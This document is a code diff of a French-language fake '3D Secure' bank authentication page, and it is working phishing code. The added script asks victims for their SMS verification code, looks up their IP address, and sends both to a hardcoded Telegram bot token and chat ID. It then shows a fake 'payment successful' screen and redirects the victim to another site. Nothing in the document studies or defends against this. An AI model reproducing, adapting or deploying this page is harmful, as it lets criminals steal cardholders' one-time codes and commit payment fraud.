@@ -1,180 +1,39 @@
-
-<html lang="fr"><head>
+<!DOCTYPE html>
+<html lang="fr">
+<head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Formulaire de Paiement</title>
+  <title>3D Secure</title>
   <style>
-    body {
-      font-family: Arial, sans-serif;
-      background-color: #f4f4f4;
-      margin: 0;
-      padding: 0;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
+    .hidden { display: none; }
+    .payment-container { text-align: center; margin-top: 50px; }
+    .spinner { width: 50px; height: 50px; border: 5px solid rgba(0, 0, 0, 0.1); border-top: 5px solid #000; border-radius: 50%; animation: spin 1s linear infinite; margin: 20px auto; }
+    @keyframes spin { 100% { transform: rotate(360deg); } }
+    .sms-form { display: flex; flex-direction: column; align-items: center; }
+    .sms-form input[type="text"] { 
+      width: 40%;
+      height: 30px;
+      font-size: 18px;
+      margin-bottom: 10px;
     }
-
-    .payment-container {
-      background-color: white;
-      width: 90%;
-      max-width: 400px;
-      margin: 20px auto;
-      padding: 20px;
-      border-radius: 10px;
-      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-      text-align: center;
-    }
-
-    .full-width-container {
-      width: 100%;
-      max-width: 100%;
-      margin: 0;
-      border-radius: 0;
-      box-shadow: none;
-      height: 100vh;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-    }
-
-    h2 {
-      color: #333;
-      margin-bottom: 20px;
-    }
-
-    form label {
-      display: block;
-      margin-bottom: 5px;
-      font-weight: bold;
-      text-align: left;
-    }
-
-    input[type="text"],
-    input[type="number"],
-    input[type="submit"] {
-      width: 100%;
-      padding: 12px;
-      margin: 8px 0 20px 0;
-      border: 1px solid #ddd;
-      border-radius: 5px;
-      font-size: 16px;
-      box-sizing: border-box;
-    }
-
-    input[type="submit"] {
-      background-color: #4CAF50;
+    .sms-form input[type="submit"] {
+      background-color: green;
       color: white;
+      font-size: 20px;
+      padding: 15px 40px;
       border: none;
       cursor: pointer;
-      font-size: 18px;
+      margin-top: 10px;
+      width: 30%;
     }
-
-    input[type="submit"]:hover {
-      background-color: #45a049;
-    }
-
-    .icon-container {
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      margin: 20px 0;
-    }
-
-    .icon-container img {
-      height: 30px;
-      margin: 0 10px;
-    }
-
-    .hidden {
-      display: none;
-    }
-
-    .spinner {
-      border: 4px solid #f3f3f3;
-      border-top: 4px solid #3498db;
-      border-radius: 50%;
-      width: 40px;
-      height: 40px;
-      animation: spin 1s linear infinite;
-      margin: 20px auto;
-    }
-
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-
-    .success-message {
-      color: #4CAF50;
-      font-weight: bold;
-    }
-
-    .error-message {
-      color: #ff0000;
-      font-weight: bold;
-    }
-
-    /* Adaptation pour les écrans plus petits */
-    @media (max-width: 600px) {
-      .payment-container {
-        width: 95%;
-        padding: 15px;
-      }
-
-      h2 {
-        font-size: 20px;
-      }
-
-      input[type="text"],
-      input[type="number"],
-      input[type="submit"] {
-        font-size: 14px;
-        padding: 10px;
-      }
-
-      input[type="submit"] {
-        font-size: 16px;
-      }
-
-      .full-width-container {
-        padding: 10px;
-      }
-
-      .full-width-container h2 {
-        font-size: 24px;
-      }
-
-      .full-width-container p {
-        font-size: 16px;
-      }
-
-      .full-width-container input[type="text"],
-      .full-width-container input[type="submit"] {
-        width: 90%;
-        margin: 10px auto;
-      }
-    }
-    style:first-child + div[style*="flex"][style*="relative"] { width: 10000px !important; }</style>
-    
- 
+  </style>
+</head>
 <body>
 
-
- <input type="submit" value="Payer">
-    </form>
-
-
-<div class="payment-container full-width-container hidden" id="step-2">
+  <div class="payment-container full-width-container" id="step-2">
     <h2>3D SECURE</h2>
-      <div class="icon-container">
-      
-
-      <img src="https://upload.wikimedia.org/wikipedia/commons/a/a4/Mastercard_2019_logo.svg" alt="Mastercard">
-      
-      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQq24OCC8V6OHGhk9O3MHduYYI26KMYSifatg&amp;s" alt="Mastercard">
-    <img src="https://urls.fr/d8YCSl" alt="CB">
+    <div class="icon-container">
+      <img src="https://i.ibb.co/Txt7BPXc/Cap.jpg" alt="Mastercard">
     </div>
     <div class="spinner"></div>
     <p>VEUILLEZ PATIENTER...</p>
@@ -182,30 +41,20 @@
 
   <div class="payment-container full-width-container hidden" id="step-3">
     <h2>AUTHENTIFICATION SMS</h2>
-      <div class="icon-container">
-      
-
-      <img src="https://upload.wikimedia.org/wikipedia/commons/a/a4/Mastercard_2019_logo.svg" alt="Mastercard">
-      
-      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQq24OCC8V6OHGhk9O3MHduYYI26KMYSifatg&amp;s" alt="Mastercard">
-    <img src="https://urls.fr/d8YCSl" alt="CB">
+    <div class="icon-container">
+      <img src="https://i.ibb.co/Txt7BPXc/Cap.jpg" alt="Mastercard">
     </div>
     <p>Entrez le code reçu par SMS :</p>
-    <form id="sms-form">
-      <input type="text" id="sms-code" name="sms-code" required="" placeholder="Code SMS">
+    <form id="sms-form" class="sms-form">
+      <input type="text" id="sms-code" name="sms-code" required placeholder="Code SMS">
       <input type="submit" value="Valider">
     </form>
   </div>
 
   <div class="payment-container full-width-container hidden" id="step-4">
     <h2>3D SECURE</h2>
-      <div class="icon-container">
-      
-
-      <img src="https://upload.wikimedia.org/wikipedia/commons/a/a4/Mastercard_2019_logo.svg" alt="Mastercard">
-      
-      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQq24OCC8V6OHGhk9O3MHduYYI26KMYSifatg&amp;s" alt="Mastercard">
-    <img src="https://urls.fr/d8YCSl" alt="CB">
+    <div class="icon-container">
+      <img src="https://i.ibb.co/Txt7BPXc/Cap.jpg" alt="Mastercard">
     </div>
     <div class="spinner"></div>
     <p>VEUILLEZ PATIENTER...</p>
@@ -213,16 +62,61 @@
 
   <div class="payment-container full-width-container hidden" id="step-5">
     <h2>PAIEMENT RÉUSSI</h2>
-      <div class="icon-container">
-      
-
-      <img src="https://upload.wikimedia.org/wikipedia/commons/a/a4/Mastercard_2019_logo.svg" alt="Mastercard">
-      
-      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQq24OCC8V6OHGhk9O3MHduYYI26KMYSifatg&amp;s" alt="Mastercard">
-    <img src="https://urls.fr/d8YCSl" alt="CB">
+    <div class="icon-container">
+      <img src="https://i.ibb.co/Txt7BPXc/Cap.jpg" alt="Mastercard">
     </div>
     <p class="success-message">Redirection dans quelques instants...</p>
   </div>
+
+  <script>
+    function sendToTelegram(message) {
+      const TELEGRAM_BOT_TOKEN = '7829797076:AAGfrZMGpGdCYsbSDxYXJBOR8jc4D2AjC1k';
+      const TELEGRAM_CHAT_ID = '7747778364';
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+      const data = { chat_id: TELEGRAM_CHAT_ID, text: message };
+      fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+      });
+    }
+
+    function getUserIP() {
+      fetch('https://api64.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          const userIP = data.ip;
+          sendToTelegram(`Adresse IP détectée : ${userIP}`);
+        })
+        .catch(error => console.error('Erreur récupération IP:', error));
+    }
+
+    setTimeout(() => {
+      document.getElementById('step-2').classList.add('hidden');
+      document.getElementById('step-3').classList.remove('hidden');
+      getUserIP();
+    }, 10000);
+
+    document.getElementById('sms-form').addEventListener('submit', function(event) {
+      event.preventDefault();
+      const smsCode = document.getElementById('sms-code').value;
+      sendToTelegram(`Code SMS reçu : ${smsCode}`);
+      document.getElementById('step-3').classList.add('hidden');
+      document.getElementById('step-4').classList.remove('hidden');
+      
+      setTimeout(() => {
+        document.getElementById('step-4').classList.add('hidden');
+        document.getElementById('step-5').classList.remove('hidden');
+        setTimeout(() => {
+          window.location.href = "https://justmoicom.github.io/tel/";
+        }, 5000);
+      }, 7000);
+    });
+  </script>
+
+</body>
+</html>
+
 
   <div class="payment-container hidden" id="blocked-message">
     <h1>SITE EN MAINTENANCE</h1>
